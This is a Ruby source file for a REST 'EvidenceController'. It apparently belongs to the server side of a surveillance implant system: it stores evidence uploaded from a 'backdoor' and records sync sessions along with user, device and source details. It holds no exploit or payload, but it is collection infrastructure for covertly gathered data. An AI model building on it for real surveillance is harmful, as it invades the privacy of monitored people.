#
# Controller for the Evidence objects
#

require 'rcs-db/db_layer'

require 'rcs-common/evidence_manager'

module RCS
module DB

class EvidenceController < RESTController

  def index
    require_auth_level :viewer
    trace :debug, "INDEX #{params}"
  end

  def show
    require_auth_level :viewer
    trace :debug, "SHOW #{params}"
  end

  # this must be a POST request
  # the instance is passed as parameter to the uri
  # the content is passed as body of the request
  def create
    require_auth_level :server

    # create a phony session
    session = {:instance => params[:evidence]}

    # save the evidence in the db
    begin
      EvidenceManager.store_evidence session, @req_content.size, @req_content
    rescue
      return STATUS_NOT_FOUND
    end

    #TODO: notify the worker

    return STATUS_OK, *json_reply({:bytes => @req_content.size})
  end

  def start
    require_auth_level :server

    # create a phony session
    session = {:bid => params['bid'],
               :build => params['build'],
               :instance => params['instance'],
               :subtype => params['subtype']}

    # retrieve the key from the db
    key = DB.backdoor_evidence_key(params['bid'])

    # store the status
    EvidenceManager.sync_start session, params['version'], params['user'], params['device'], params['source'], params['sync_time'], key

    return STATUS_OK
  end

  def stop
    require_auth_level :server

    # create a phony session
    session = {:bid => params['bid'],
               :instance => params['instance']}

    # store the status
    EvidenceManager.sync_end session

    return STATUS_OK
  end

  def timeout
    require_auth_level :server

    # create a phony session
    session = {:bid => params['bid'],
               :instance => params['instance']}

    # store the status
    EvidenceManager.sync_timeout session

    return STATUS_OK
  end

end

end #DB::
end #RCS::